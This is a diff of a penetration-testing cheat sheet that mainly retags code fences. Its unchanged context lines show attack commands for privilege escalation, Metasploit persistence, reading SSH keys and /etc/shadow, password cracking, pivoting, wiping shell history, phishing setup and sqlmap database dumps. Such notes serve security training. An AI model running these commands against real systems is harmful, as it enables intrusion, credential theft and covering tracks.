@@ -2806,9 +2806,7 @@ perl -e 'exec "/bin/bash";'
 
 **Win Privilege Escalation**
 
-
-
-```
+```ps1
 # PrivescCHECK - PowerShell script
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"
 
@@ -2821,9 +2819,7 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -R
 
 **Linux Privilege Escalation**
 
-
-
-```
+```sh
 # Writable files
 find / -not -type l -perm -o+w
 
@@ -2845,9 +2841,7 @@ sudo man ls
 
 **Win Persistence**
 
-
-
-```
+```sh
 # msfcosole - Admin Meterpreter
 search platform:windows persistence
 use exploit/windows/local/persistence_service
@@ -2862,9 +2856,7 @@ run getgui -e -u <NEWUSER> -p <PW>
 
 **Linux Persistence**
 
-
-
-```
+```sh
 ls -lah ~/.ssh/
 cat ~/.ssh/id_rsa
 cat ~/.ssh/authorized_keys
@@ -2888,11 +2880,9 @@ nc -nvlp <PORT>
 
 **Dumping & Cracking**
 
-
-
 **Windows**
 
-```
+```sh
 hashdump
 
 # JohnTheRipper
@@ -2917,7 +2907,7 @@ hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 
 **Linux**
 
-```
+```sh
 cat /etc/shadow
 
 # Metasploit
@@ -2935,9 +2925,7 @@ ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 
 **Pivoting**
 
-
-
-```
+```sh
 # Checking Routes
 ip route    # Checking defined routes in linux
 route       # Checking defined routes in linux
@@ -2967,9 +2955,7 @@ db_nmap -sS -sV -p <LOCAL_PORT> localhost
 
 **Clearing Tracks**
 
-
-
-```
+```sh
 # Windows C:\Temp - Metasploit e.g.
 cd C:\\
 mkdir Temp
@@ -2992,9 +2978,7 @@ cat /dev/null > ~/.bash_history
 
 #### Social Engineering
 
-
-
-```
+```sh
 # GOPHISH - Linux Install
 cd /opt/
 # Get the latest version link from https://github.com/gophish/gophish/releases/
@@ -3016,7 +3000,7 @@ docker run -ti -p 3333:3333 --rm gophish/demo
 
 
 
-```
+```sh
 # Gobuster - Install
 sudo apt update && sudo apt install -y gobuster
 
@@ -3116,7 +3100,7 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"     
 
 **Get database if injection Exists**
 
-```
+```sh
 sqlmap -r login.req --dbs
 sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
@@ -3131,7 +3115,7 @@ sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "
 
 **Get Tables in a Database**
 
-```
+```sh
 sqlmap -r login.req -D dbname --tables    #determine the tables:
 sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
@@ -3140,7 +3124,7 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D d
 
 **Get data in a Database tables**
 
-```
+```sh
 sqlmap -r login.req -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
@@ -3189,7 +3173,7 @@ nc -vv -k -l -p 80
 
 **XSSer**
 
-```
+```sh
 xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
 
